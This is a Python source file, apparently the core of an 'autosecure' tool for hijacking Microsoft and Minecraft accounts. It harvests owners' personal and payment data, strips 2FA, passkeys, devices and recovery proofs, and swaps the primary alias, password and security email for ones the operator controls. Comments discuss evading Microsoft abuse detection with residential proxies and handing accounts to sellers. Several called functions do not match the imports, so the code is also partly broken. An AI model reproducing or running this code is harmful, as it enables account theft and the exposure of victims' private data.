from authsecuring.utils.security.change_primary_alias import promote_alias
from authsecuring.utils.security.get_security_mail import fetch_security_mail
from authsecuring.utils.security.add_authenticator import enroll_mfa
from authsecuring.utils.security.get_recovery_code import mint_recovery
from authsecuring.utils.security_information import gather_security_info
from authsecuring.utils.security.remove_services import strip_app_links
from authsecuring.utils.security.remove_devices import purge_devices
from authsecuring.utils.security.delete_aliases import wipe_foreign_aliases
from authsecuring.utils.security.remove_proof import strip_proofs
from authsecuring.utils.security.remove_fed_cred import wipe_fed_creds
from authsecuring.utils.security.leave_family import leave_family_group
from authsecuring.utils.security.remove_zyger import strip_passkeys
from authsecuring.utils.security.remove_2fa import drop_2fa
from authsecuring.utils.security.recovery import recover

from authsecuring.utils.ogi.get_subscriptions import fetch_subscriptions
from authsecuring.utils.ogi.get_owner_info import fetch_owner
from authsecuring.utils.ogi.get_contacts import fetch_contacts
from authsecuring.utils.ogi.get_devices import fetch_devices
from authsecuring.utils.ogi.get_family import fetch_family
from authsecuring.utils.ogi.get_cards import fetch_cards

from authsecuring.utils.cookies.get_cookies import get_cookies
from authsecuring.utils.cookies.get_amrp import get_amrp
from authsecuring.utils.cookies.get_amc import get_amc
from authsecuring.utils.cookies.get_t import get_t
from authsecuring.utils.cookies.safe_cookies import iter_cookie_jar

from authsecuring.utils.security.logout_all import kick_sessions

from mc.get_profile import fetch_profile
from mc.get_ssid import fetch_ssid

from mc.get_namechange import fetch_namechange
from mc.get_method import fetch_method
from mc.get_capes import fetch_capes
from mc.get_xbl import fetch_xbl
from mc.retry import NoMinecraftEntitlement

from storage.romeo_db import RomeoDB as DBConnection
import asyncio
import httpx
import uuid
import json
import logging

rom = logging.getLogger(__name__)

MC_PROBE_FAILED = "Unknown (MC check failed)"


def _stash_cookies(src: httpx.AsyncClient) -> httpx.Cookies:
    """Copy auth cookies into a new jar (avoids sharing the proxied transport).

    Critically preserves ``__Host-MSAAUTH`` / ``__Secure-*`` host-only + Secure
    flags. A naive ``Cookies.set(..., domain=...)`` drop of ``secure`` causes
    Xbox sisu SSO to land on a login HTML page (no Location) → false MC-check fails.
    """
    from http.cookiejar import Cookie as JarCookie

    jar = httpx.Cookies()
    for c in iter_cookie_jar(src):
        secure = bool(getattr(c, "secure", False)) or c.name.startswith(
            ("__Host-", "__Secure-")
        )
        domain = c.domain or ""
        # __Host- cookies must not carry a Domain attribute
        if c.name.startswith("__Host-"):
            domain = ""
            domain_specified = False
            domain_initial_dot = False
            secure = True
        else:
            domain_specified = bool(getattr(c, "domain_specified", bool(domain)))
            domain_initial_dot = domain.startswith(".") if domain else False
        try:
            jar.jar.set_cookie(
                JarCookie(
                    version=0,
                    name=c.name,
                    value=c.value,
                    port=None,
                    port_specified=False,
                    domain=domain,
                    domain_specified=domain_specified,
                    domain_initial_dot=domain_initial_dot,
                    path=c.path or "/",
                    path_specified=True,
                    secure=secure,
                    expires=getattr(c, "expires", None),
                    discard=True,
                    comment=None,
                    comment_url=None,
                    rest={"HttpOnly": None},
                    rfc2109=False,
                )
            )
        except Exception:
            try:
                jar.set(c.name, c.value, domain=domain or None, path=c.path or "/")
            except Exception:
                jar.set(c.name, c.value)
    return jar


async def _xbl_client(session: httpx.AsyncClient) -> httpx.AsyncClient:
    """Xbox/Minecraft SSO client.

    login.live.com / account.live.com stay on the same sticky residential proxy
    as login. Sending ``__Host-MSAAUTH`` from the VPS is what stamped
    208.84.101.140 on password-change mail and tripped account.live.com/Abuse.
    sisu.xboxlive.com often dies through residential HTTP CONNECT, so Xbox
    hosts go direct.
    """
    from authsecuring.utils.proxy import LiveXboxSplitTransport, microsoft_proxy_url

    headers = {
        "User-Agent": session.headers.get(
            "User-Agent",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    }
    kwargs = {
        "cookies": _stash_cookies(session),
        "headers": headers,
        "timeout": httpx.Timeout(45.0, connect=20.0),
        "follow_redirects": False,
        "http2": False,
        "trust_env": False,
    }
    proxy_url = microsoft_proxy_url(session)
    if not proxy_url:
        print("[!] - No proxy configured — XBL client is fully direct")
        return httpx.AsyncClient(proxy=None, **kwargs)

    print("[~] - XBL SSO: Live/account.live.com via sticky proxy, Xbox CDN direct")
    return httpx.AsyncClient(
        transport=LiveXboxSplitTransport(proxy_url),
        **kwargs,
    )


async def _probe_mc(session: httpx.AsyncClient, account_info: dict) -> str:
    """Populate account_info['minecraft']. Returns outcome:
    'ok' | 'no_java' | 'no_mc' | 'transient'
    """
    print("[~] - Checking Minecraft Account")
    sec_mail = (account_info.get("microsoft") or {}).get("security_email")
    if sec_mail in (None, "", "Couldn't Change!", "Unknown", "N/A"):
        sec_mail = None
    xbl_client = await _xbl_client(session)
    try:
        xbl_hit = await fetch_xbl(xbl_client, sec_mail=sec_mail)
    finally:
        await xbl_client.aclose()

    if not xbl_hit:
        print("[x] - Failed to get XBL (network/auth race — NOT marking as no MC)")
        account_info["minecraft"]["name"] = MC_PROBE_FAILED
        account_info["minecraft"]["own_method"] = "Unknown (MC check failed)"
        return "transient"

    print("[+] - Got XBL (Has Xbox Profile)")
    xbl = xbl_hit["xbl"]
    gamertag = xbl_hit.get("gamertag")
    if gamertag:
        account_info["minecraft"]["gamertag"] = gamertag

    try:
        xbl_ssid = await fetch_ssid(xbl)
    except NoMinecraftEntitlement as exc:
        print(f"[x] - No Minecraft entitlement from login_with_xbox ({exc})")
        account_info["minecraft"]["name"] = "No Minecraft"
        account_info["minecraft"]["own_method"] = "Not purchased"
        account_info["minecraft"]["SSID"] = False
        account_info["minecraft"]["ent_data"] = "no_entitlement"
        return "no_mc"

    if not xbl_ssid:
        # XBL worked but SSID failed — often rate-limit / auth race, not "no MC"
        print("[x] - Failed to get SSID (retryable — NOT marking as no MC)")
        if gamertag:
            account_info["minecraft"]["name"] = f"{gamertag} (MC check failed)"
        else:
            account_info["minecraft"]["name"] = MC_PROBE_FAILED
        account_info["minecraft"]["own_method"] = "Unknown (MC check failed)"
        return "transient"

    print("[+] - Got SSID (Minecraft access token)")
    account_info["minecraft"]["SSID"] = xbl_ssid

    # Ownership type from game_minecraft entitlement source (PURCHASE vs GAMEPASS)
    ent_data = await fetch_method(xbl_ssid)
    own_method = ent_data.get("own_method")
    account_info["minecraft"]["ent_data"] = ent_data.get("items_summary") or []
    account_info["minecraft"]["entitlement_source"] = ent_data.get(
        "game_minecraft_source"
    ) or ent_data.get("product_minecraft_source")
    if own_method:
        account_info["minecraft"]["own_method"] = own_method
        src = account_info["minecraft"]["entitlement_source"] or "?"
        print(
            f"[+] - Ownership via ent_data: {own_method} "
            f"(game_minecraft source={src}, endpoint={ent_data.get('endpoint')})"
        )
        if ent_data.get("items_summary"):
            print(f"    items: {', '.join(str(x) for x in ent_data['items_summary'][:12])}")
    else:
        # SSID worked but no game_minecraft / product_minecraft with known source
        if ent_data.get("owns_minecraft") is False:
            account_info["minecraft"]["own_method"] = "Not purchased"
            print("[x] - Entitlements: no game_minecraft ownership")
        else:
            print("[!] - Entitlements inconclusive — leaving own_method unset")

    try:
        cape_list = await fetch_capes(xbl_ssid)
    except Exception:
        cape_list = []
    if cape_list:
        account_info["minecraft"]["cape_list"] = ", ".join(
            i.get("alias", i.get("id", "Unknown")) for i in cape_list
        )
        print("[+] - Got cape_list")
    else:
        account_info["minecraft"]["cape_list"] = "No cape_list"

    mc_profile = await fetch_profile(xbl_ssid)
    if mc_profile and mc_profile.get("name"):
        print("[+] - Got mc_profile (Has Minecraft Java)")
        account_info["minecraft"]["name"] = mc_profile["name"]
        if mc_profile.get("uuid"):
            account_info["minecraft"]["uuid"] = mc_profile["uuid"]

        try:
            name_change_data = await get_username_info(xbl_ssid)
        except Exception:
            name_change_data = False
        if not name_change_data:
            account_info["minecraft"]["uchange"] = "Yes"
        else:
            account_info["minecraft"]["uchange"] = f"Changeable in {name_change_data} days"
    else:
        print("[x] - No Java mc_profile (Bedrock/Game Pass only / never launched)")
        account_info["minecraft"]["name"] = f"{gamertag} (No Java)" if gamertag else "Owned — No Java Profile"
        account_info["minecraft"]["uchange"] = "N/A"
        mc_profile = None

    return "ok" if mc_profile else "no_java"


def _is_romeo_generated(email: str | None) -> bool:
    """True if main_email is already an autosecure-generated sunny*@outlook.com."""
    text = str(email or "").strip().lower()
    if "@" not in text:
        return False
    local, _, domain = text.partition("@")
    if domain != "outlook.com":
        return False
    # Current generator: sunny{12 hex}. Also accept legacy sunnymeow.* presets.
    return local.startswith("sunny")


async def lock_account(
    session: httpx.AsyncClient,
    command: bool,
    recovery: bool,
    account_info: dict,
    embed_verify: bool = False,
):
    # Main file where all processes to securing the account occur

    # To auto update if you edit the config via command
    config = json.load(open("config/config.json", "r"))
    swap_alias = config["autosecure"]["replace_main_alias"]
    add_mfa = config["autosecure"]["add_mfa"]
    skip_mc = config["autosecure"]["minecon_mode"] and not command
    domain = config["domain"]
    
    # Token needed to make API requests for the account
    try:
        msa_tokens = await fetch_amc_token(session)
    except Exception as exc:
        from authsecuring.utils.proxy import format_exception_reason

        err_detail = proxy_error_reason(exc)
        rom.exception("get_amc failed: %s", err_detail)
        print(f"[X] - get_amc failed: {err_detail}")
        raise

    canary = await fetch_canary(session)
    if not canary:
        print("[!] - No apiCanary from password/reset — will retry later for SA ops")
        rom.warning("get_cookies returned no apiCanary — continuing into MC check")

    t = None
    try:
        t = await fetch_t(session)
        if t:
            await fetch_amrp(session, t)
            print(f"[+] - Got T / AMRP")
        else:
            print("[!] - No classic login t token (already signed in) — skipping AMRP")
    except Exception as exc:
        rom.warning("get_t/amrp failed — continuing with existing session: %s", exc)
        print(f"[!] - get_t/AMRP skipped ({exc.__class__.__name__}) — continuing")


    # Minecraft checking — retry when XBL/SSID fail_eb (rate limit / parse race).
    # Never label transient failures as "No Minecraft" — that was a false negative
    # when VaultProxies killed sisu.xboxlive.com connections.
    # CatB overprotective during sisu is completed via security-email OTP.
    mc_attempts = 6
    for try_n in range(1, mc_attempts + 1):
        outcome = await _probe_mc(session, account_info)
        if outcome != "transient":
            break
        if try_n < mc_attempts:
            # Fixed short gap — old 10s×try_n (capped 45s) burned ~2.5min on
            # proxy/XBL races that usually clear on the next try within seconds.
            delay = 5.0
            print(f"[~] - MC check inconclusive (try_n {try_n}/{mc_attempts}), retrying in {delay:.0f}s...")
            rom.warning("MC check transient failure try_n %s/%s — sleeping %.1fs", try_n, mc_attempts, delay)
            await asyncio.sleep(delay)
        else:
            print(f"[x] - MC check still failed after retries — keeping '{account_info['minecraft'].get('name')}'")
            if account_info["minecraft"].get("name") in (None, "", "No Minecraft"):
                account_info["minecraft"]["name"] = MC_PROBE_FAILED
            if account_info["minecraft"].get("own_method") in (None, "", "Not purchased"):
                account_info["minecraft"]["own_method"] = "Unknown (MC check failed)"
            rom.error(
                "MC check failed after %s attempts for %s (gamertag=%s) — NOT confirming no MC",
                mc_attempts,
                account_info.get("microsoft", {}).get("email"),
                account_info["minecraft"].get("gamertag"),
            )

    if embed_verify:
        from authsecuring.filters import is_embed_verify_no_minecraft

        if is_no_java_embed(account_info):
            print(
                "[!] - Embed verify: no Minecraft Java — "
                "stopping before credential change"
            )
            rom.info(
                "embed verify no Minecraft Java for %s (name=%s own_method=%s)",
                account_info.get("microsoft", {}).get("email"),
                account_info.get("minecraft", {}).get("name"),
                account_info.get("minecraft", {}).get("own_method"),
            )
            account_info["embed_no_minecraft"] = True
            return account_info

    # Refresh canary after MC / SSO elevation (password/reset may work now)
    if not canary:
        canary = await fetch_canary(session)
        if canary:
            print("[+] - Got apiCanary after MC check")

    # Gets account info via microsofts API
    subscriptions = await fetch_subscriptions(session, msa_tokens["home"])
    family = await fetch_family(session, msa_tokens["home"])
    devices = await fetch_devices(session, msa_tokens["home"])
    cards = await fetch_cards(session, msa_tokens["home"])
    contacts = await fetch_contacts(session, msa_tokens["home"])

    owner_info = await fetch_owner(session, msa_tokens["mc_profile"])
    if not isinstance(owner_info, dict):
        owner_info = {}
    # Profile API often 401s when MSAL silent bridge never finishes — JWT still
    # has given_name / family_name / birthdate / ctry (dona-era accounts too).
    if not owner_info.get("firstName") and not owner_info.get("signInEmail"):
        from authsecuring.utils.ogi.owner_from_jwt import owner_info_from_amc_jwt

        jwt_info = jwt_to_owner(session)
        if jwt_info:
            owner_info = {**jwt_info, **{k: v for k, v in owner_info.items() if v}}
    if not isinstance(contacts, dict):
        contacts = {}
    if not isinstance(family, dict):
        family = {}
    if not isinstance(devices, dict):
        devices = {}
    if not isinstance(cards, dict):
        cards = {}
    if not isinstance(subscriptions, dict):
        subscriptions = {}

    # Organizer-in-family is not the child Family-Locked login interrupt.
    # Kick other members first (last_err-admin), then leave so autobuy doesn't reject.
    try:
        left = await leave_family_group(
            session,
            home_token=msa_tokens.get("home"),
        )
        if isinstance(left, dict):
            account_info["microsoft"]["family_leave"] = {
                "kicked": int(left.get("kicked") or 0),
                "left": bool(left.get("left")),
                "error": left.get("error"),
            }
            remaining = left.get("remaining")
            if left.get("attempted") and isinstance(remaining, list):
                family = {**family, "members": remaining}
    except Exception as exc:
        rom.warning("leave_family soft-fail_eb: %s", exc)
        print(f"[!] - leave_family skipped ({exc.__class__.__name__})")

    print("[+] - Got DOB (Subscriptions, Family, Devices, Card...)")
    account_info["microsoft"]["firstName"] = owner_info.get("firstName") or "Failed to Get"
    account_info["microsoft"]["lastName"] = owner_info.get("lastName") or "Failed to Get"
    account_info["microsoft"]["fullName"] = owner_info.get("fullName") or "Failed to Get"
    account_info["microsoft"]["region"] = owner_info.get("region") or "Failed to Get"
    account_info["microsoft"]["birthday"] = owner_info.get("birthday") or "Failed to Get"
    account_info["microsoft"]["language"] = owner_info.get("msaDisplayLanguage") or "Failed to Get"
    account_info["microsoft"]["phones"] = (
        (contacts.get("msaPhones") or []) + (contacts.get("mmxPhones") or [])
    )

    account_info["microsoft"]["family"] = family.get("members") or family.get("Members") or []
    account_info["microsoft"]["devices"] = devices.get("devices") or []
    account_info["microsoft"]["cards"] = cards.get("paymentInstruments") or []
    account_info["microsoft"]["subscriptions"] = {
        "active":     subscriptions.get("active") or [],
        "canceled":   subscriptions.get("canceled") or [],
        "commercial": subscriptions.get("commercial") or [],
    }
    
    await fetch_amrp(session, t) if t else None
    if t:
        print(f"[+] - Got AMRP")

    # 2FA
    if canary:
        await drop_2fa(session, canary)
    else:
        print("[!] - [~] skip 2fa (no apiCanary)")
        rom.warning("skipping remove_2fa — no apiCanary")

    ms = account_info.get("microsoft") or {}
    old_recovery = ms.get("recovery_code")
    got_recovery = bool(
        old_recovery and old_recovery not in ("Couldn't Change!", "Failed to generate")
    )
    # Prefer previously-secured password for i5600 MFA (seller TOTP password is often stale).
    mfa_pwd = ms.get("secured_password") or ms.get("password")

    sec_params = None
    try:
        # After recover we already have password + recovery. Skip proofs OTP only when
        # we are NOT changing main_email alias — names/manage needs SA elevation (i5600).
        # Already-sunny re-secures: skip i5600 entirely (MS rejects GOTC with 203/204).
        already_sunny = _is_romeo_generated(ms.get("email"))
        skip_i5600 = got_recovery and (not swap_alias or already_sunny)
        sec_params = json.loads(
            await gather_security_info(
                session,
                sec_mail=ms.get("security_email"),
                account_email=ms.get("email"),
                password=mfa_pwd,
                skip_i5600_otp=skip_i5600,
            )
        )
    except RuntimeError as exc:
        # i5600 "Help us protect" often blocks proofs/Manage after recover already
        # succeeded — or on re-secure when GetOneTimeCode returns 203/204.
        # Soft-continue when we have a recovery code so RecoverUser can still run.
        fail_msg = str(exc)
        abuse_blocked = (
            "Abuse" in fail_msg
            or "unusual-activity" in fail_msg.lower()
            or "unusual activity" in fail_msg.lower()
        )
        i5600_blocked = (
            "could not find var t0" in fail_msg
            or "Help-us-protect" in fail_msg
            or "i5600" in fail_msg
            or "proofs page" in fail_msg
        )
        if abuse_blocked or (got_recovery and i5600_blocked):
            rom.warning(
                "security_information soft-skip after recover for %s: %s",
                ms.get("email"),
                fail_msg[:300],
            )
            print(
                "[!] - Proofs page blocked "
                f"({'Abuse lock' if abuse_blocked else 'i5600 MFA'}) — "
                "continuing without proofs/Manage t0"
            )
            sec_params = None
        else:
            raise

    main_email = None
    if sec_params:
        main_email = sec_params.get("email") or account_info["microsoft"].get("email")
    else:
        main_email = account_info["microsoft"].get("email")
    # Seed main_email immediately so partial failures still show the real address
    if main_email and main_email != "Couldn't Change!":
        account_info["microsoft"]["email"] = main_email
        # Freeze seller-visible address before any main_email alias replace
        if not account_info["microsoft"].get("original_email"):
            account_info["microsoft"]["original_email"] = main_email
    print(f"[+] - [+] security params (main_email={account_info['microsoft']['email']})")

    net_id = None
    if sec_params:
        try:
            net_id = sec_params["WLXAccount"]["manageProofs"]["encryptedNetId"]
        except (KeyError, TypeError):
            net_id = None
            rom.warning("sec_params missing manageProofs.encryptedNetId")

    if recovery or not got_recovery:
        new_code = None
        if net_id:
            new_code = await mint_recovery(
                session,
                canary,
                net_id
            )
        if new_code:
            recov_code = new_code
        elif got_recovery:
            recov_code = old_recovery
        else:
            recov_code = "Failed to generate"
            print("[X] - Failed to generate recovery code")
    else:
        recov_code = old_recovery
        print(f"[+] - Keeping existing recovery code from recovery flow")

    print(f"[+] - [+] recovery code | {recov_code}")

    if skip_mc:
        account_info["microsoft"]["email"] = main_email or account_info["microsoft"]["email"]
        account_info["microsoft"]["password"] = "Unknown"
        account_info["microsoft"]["recovery_code"] = recov_code

        # Get security mail
        sec_mail = await fetch_security_mail(session)
        account_info["microsoft"]["security_email"] = sec_mail
        print(f"[+] - Got Security Email | {sec_mail}")
    else:
        account_info["microsoft"]["recovery_code"] = recov_code

    if not skip_mc:

        # Pass Keys / Windows Hello / FedCred (Samsung+Apple sign-in) / proofs
        if canary:
            await strip_passkeys(session, canary)
            # Sign in with Samsung/Apple/Google/… — RemoveFedCred, not DeleteProof
            try:
                fed = await wipe_fed_creds(session, canary)
                if isinstance(fed, dict):
                    account_info["microsoft"]["fed_cred_removed"] = fed.get("removed") or []
            except Exception as exc:
                rom.warning("remove_fed_cred soft-fail_eb: %s", exc)
                print(f"[!] - remove_fed_cred skipped ({exc.__class__.__name__})")
            # Wipe foreign proofs / passkeys (iCloud Keychain, Samsung Pass,
            # Google Password Manager via RemovePasskey) / auth apps —
            # keep OUR recovery security email.
            keep_sec_mail = (account_info.get("microsoft") or {}).get("security_email")
            proof_wipe = await strip_proofs(
                session,
                canary,
                keep_security_email=keep_sec_mail,
                keep_domain=domain,
            )
            if isinstance(proof_wipe, dict):
                account_info["microsoft"]["has_sms_proof"] = bool(
                    proof_wipe.get("has_sms_proof")
                )
                account_info["microsoft"]["passkeys_removed"] = int(
                    proof_wipe.get("passkeys_removed") or 0
                )
            else:
                account_info["microsoft"]["has_sms_proof"] = False
        else:
            print("[!] - [~] skip passkeys/remove_fed_cred/remove_proof (no apiCanary)")
            account_info["microsoft"]["has_sms_proof"] = None

        # Third Party Launchers (Minecraft, Prism)
        try:
            await strip_app_links(session)
        except Exception as exc:
            rom.warning("remove_services soft-fail_eb: %s", exc)
            print(f"[!] - remove_services skipped ({exc.__class__.__name__})")

        # Remove Microsoft Devices
        try:
            await purge_devices(session, msa_tokens["devices"], devices)
        except Exception as exc:
            rom.warning("remove_devices soft-fail_eb: %s", exc)
            print(f"[!] - remove_devices skipped ({exc.__class__.__name__})")

        # Seed login email before alias replace (updated only if MakePrimary wins)
        if main_email:
            account_info["microsoft"]["email"] = main_email

        # Primary alias replace does NOT require sec_params / t0 —
        # only canary + names/manage session (dona-fork flow).
        if swap_alias:
            ms = account_info.get("microsoft") or {}
            # Preserve seller-visible original before promote
            if not ms.get("original_email"):
                ms["original_email"] = ms.get("email") or main_email
                account_info["microsoft"] = ms

            active_alias = str(
                ms.get("email") or main_email or ""
            ).strip().lower()
            # Already an autosecure sunny* main_email — don't burn another replace
            if _is_romeo_generated(active_alias):
                print(
                    f"[+] - Primary already autosecure sunny ({active_alias}) "
                    "— skipping alias replace"
                )
                account_info["microsoft"]["primary_alias_replaced"] = True
                # Still strip foreign aliases (old outlook / gmail / etc.)
                print("[~] - [~] proof_wipe aliases while keeping sunny main_email")
            else:
                print("[~] - [~] swap main_email")
                alias_swapped = False
                last_local = ""
                max_swap = 3
                # If a prior try_n already added a sunny* alias but MakePrimary
                # flaked, promote that one instead of burning a new AddAssocId
                # (MS rate-limits → "try again later").
                parked_alias: str | None = None
                for try_n in range(1, max_swap + 1):
                    if parked_alias:
                        new_alias = parked_alias
                        print(
                            f"[~] - main_email try_n {try_n}/{max_swap} "
                            f"(re-promote {new_alias}@outlook.com)"
                        )
                    else:
                        new_alias = f"sunny{uuid.uuid4().hex[:12]}"
                        print(
                            f"[~] - main_email try_n {try_n}/{max_swap} "
                            f"({new_alias}@outlook.com)"
                        )
                    last_local = new_alias
                    # Refresh canary between retries — stale after MFA / failed AddAssocId
                    try:
                        fresh = await fetch_canary(session)
                        if fresh:
                            canary = fresh
                    except Exception:
                        pass
                    alias_swapped = await promote_alias(
                        session,
                        new_alias,
                        canary,
                        sec_mail=ms.get("security_email"),
                        account_email=ms.get("original_email") or ms.get("email") or main_email,
                        password=ms.get("password"),
                    )
                    if alias_swapped:
                        account_info["microsoft"]["email"] = f"{new_alias}@outlook.com"
                        account_info["microsoft"]["primary_alias_replaced"] = True
                        break
                    # Detect sunny we already parked on the account
                    try:
                        from authsecuring.utils.security.change_primary_alias import (
                            _get_manage,
                        )

                        _, _, aliases_now = await fetch_manage_page(session)
                        parked = [
                            a.split("@", 1)[0]
                            for a in aliases_now
                            if a.lower().startswith("sunny")
                            and a.lower().endswith("@outlook.com")
                        ]
                        if parked:
                            parked_alias = parked[0]
                            print(
                                f"[~] - Sunny alias already on account "
                                f"({parked_alias}@outlook.com) — "
                                "will re-promote next try_n"
                            )
                        else:
                            parked_alias = None
                    except Exception:
                        parked_alias = None
                    if try_n < max_swap:
                        await asyncio.sleep(2.0 * try_n)

                if not alias_swapped:
                    # MakePrimary JSON can lie. Confirm via names/manage membername
                    # (old login still exists — live UI uses removeOldPrimary=false)
                    # or GCT if Microsoft dropped the previous Outlook login.
                    try:
                        from authsecuring.utils.security.change_primary_alias import (
                            _confirm_primary_switched,
                        )

                        alias_pool: list[str] = []
                        if parked_alias:
                            alias_pool.append(parked_alias)
                        if last_local and last_local not in alias_pool:
                            alias_pool.append(last_local)
                        prev_alias = (
                            ms.get("original_email")
                            or ms.get("email")
                            or main_email
                        )
                        for loc in alias_pool:
                            trial_alias = f"{loc}@outlook.com"
                            if await confirm_primary_moved(
                                session, trial_alias, prev_alias
                            ):
                                alias_swapped = True
                                account_info["microsoft"]["email"] = trial_alias
                                account_info["microsoft"][
                                    "primary_alias_replaced"
                                ] = True
                                print(
                                    f"[+] - Primary replace recovered via "
                                    f"post-check ({trial_alias})"
                                )
                                break
                    except Exception as exc:
                        rom.warning(
                            "main_email replace post-check failed: %s", exc
                        )

                if not alias_swapped:
                    current_email = account_info["microsoft"]["email"]
                    account_info["microsoft"]["primary_alias_replaced"] = False
                    print(
                        f"[X] - Failed to change Primary Email after "
                        f"{max_swap} attempts (keeping {current_email}; "
                        f"last_err tried {last_local}@outlook.com)"
                    )
        else:
            account_info["microsoft"]["primary_alias_replaced"] = None

        # RecoverUser needs a usable recovery code — NOT sec_params/t0.
        # When i5600 blocks proofs Manage we soft-skip (sec_params=None)
        # but must still mint a new password + security email via RecoverUser.
        can_recover = bool(
            recovery
            and recov_code
            and recov_code not in ("Couldn't Change!", "Failed to generate", "invalid")
        )
        if can_recover:

            sec_mail = uuid.uuid4().hex[:16]
            from authsecuring.utils.security.password_gen import generate_ms_password
            password = make_ms_password(14)

            sec_mail = f"{sec_mail}@{domain}"
            print(f"[+] - [+] sec email ({sec_mail})")
            with DBConnection() as database:
                database.add_security_email(sec_mail, password)

            # RecoverUser must use the *current* main_email. After MakePrimary the
            # sunny@ alias is the login identity — resetting against the old
            # Outlook address often fails parse / leaves sellers with a dead
            # "Login Email" that no longer works.
            recover_login = (
                str(
                    (account_info.get("microsoft") or {}).get("email")
                    or main_email
                    or ""
                ).strip()
                or main_email
            )
            if not sec_params:
                print(
                    "[!] - RecoverUser without proofs t0 "
                    "(i5600 soft-skip / no sec_params)"
                )
            print(f"[~] - [~] locking Account... ({recover_login})")
            try:
                data = await recover(
                    session,
                    recover_login,
                    recov_code,
                    sec_mail,
                    password,
                )
            except Exception as exc:
                # Keep sunny@ / original_email already written above so give-back
                # embeds never fall back to the deleted Outlook main_email.
                logging.exception(
                    "RecoverUser failed after alias steps for %s (login=%s)",
                    main_email,
                    recover_login,
                )
                print(
                    f"[X] - RecoverUser failed ({exc.__class__.__name__}: {exc}) "
                    f"— main_email current_email as {recover_login}"
                )
                account_info["microsoft"]["recover_error"] = (
                    f"{exc.__class__.__name__}: {exc}"
                )
                raise

            if data and data != "invalid":
                account_info["microsoft"]["security_email"] = sec_mail
                account_info["microsoft"]["recovery_code"] = data
                account_info["microsoft"]["password"] = password
            else:
                print(f"[X] - [x] secure failed this account")
                account_info["microsoft"]["recover_error"] = (
                    "recover result = no recovery code"
                )
                raise RuntimeError(
                    "recover result = no recovery code after main_email alias change"
                )

        # Delete other login aliases (non-fatal — manage page often lacks canary)
        # Always keep the current main_email so a failed MakePrimary doesn't orphan-delete
        # a freshly added sunny* alias (previous bug).
        # Also runs after sunny-skip so old outlook/gmail aliases still get wiped.
        try:
            from authsecuring.utils.security.force_password import strip_unverified

            ms_now = account_info.get("microsoft") or {}
            await wipe_foreign_aliases(
                session,
                keep_email=ms_now.get("email"),
                sec_mail=ms_now.get("security_email"),
                account_email=ms_now.get("original_email") or ms_now.get("email"),
                password=clean_password(ms_now.get("password")),
            )
        except Exception as exc:
            logging.warning("delete_aliases soft-skip: %s", exc)
            print(f"[~] - [~] skip alias proof_wipe ({exc.__class__.__name__})")

        # Always verify password stuck after RecoverUser — MS often rotates the
        # recovery code while silently ignoring the new password. Previously we
        # only ran this when marked UNVERIFIED, so Sell (2FA) got a dead password.
        try:
            from authsecuring.utils.security.force_password import ensure_password_verified

            ms_pwd = str((account_info.get("microsoft") or {}).get("password") or "")
            if ms_pwd and ms_pwd not in ("Unknown", "Couldn't Change!", "Failed"):
                await verify_password_stuck(
                    session,
                    account_info,
                    force_if_unverified=True,
                    force_if_bad=True,
                )
        except Exception as exc:
            logging.warning("force password soft-skip: %s", exc)

        # Add Authenticator
        if add_mfa:
            try:
                auth = await enroll_mfa(session)
                account_info["microsoft"]["auth_secret"] = auth
                print(f"[+] - Added Authenticator ({auth})")
            except Exception as exc:
                rom.exception("add_authenticator failed")
                print(f"[X] - Failed to add authenticator: {exc.__class__.__name__}: {exc}")
                account_info["microsoft"]["auth_secret"] = "Failed"
        else:
            print("[~] - add_mfa is off — skipping authenticator")

        # Logout all devices (non-fatal — proxy ConnectTimeout here used to abort
        # an otherwise fully secured account and return a false failure to sellers).
        if canary:
            try:
                await kick_sessions(session, canary)
            except Exception as exc:
                logging.warning("logout_all soft-skip: %s", exc)
                print(f"[~] - [~] skip logout ({exc.__class__.__name__})")
        else:
            print("[!] - [~] skip logout (no apiCanary)")

        # Phone pullback probe — HasPhone can stay 1 even when smsProofs is empty
        # on the manage page (ghost phone / legacy SMS recovery).
        try:
            from authsecuring.holdcheck import fetch_credential_type

            probe_addr = (
                (account_info.get("microsoft") or {}).get("email")
                or main_email
                or ""
            ).strip()
            phone_flag = None
            if probe_addr:
                cred_probe = await check_cred_type(probe_addr)
                cred_map = (cred_probe or {}).get("Credentials") or {}
                raw_phone = cred_map.get("HasPhone")
                phone_flag = raw_phone in (1, "1", True)
                account_info["microsoft"]["has_phone"] = phone_flag
                if phone_flag:
                    print(
                        "[!] - HasPhone=1 after proof proof_wipe — SMS/ACSR pullback still possible"
                    )
                else:
                    print("[+] - HasPhone cleared (no phone recovery flag)")
            else:
                account_info["microsoft"]["has_phone"] = None
        except Exception as exc:
            logging.warning("HasPhone probe soft-skip: %s", exc)
            account_info["microsoft"]["has_phone"] = None
        
    print("[+] - [+] secured")
    return account_info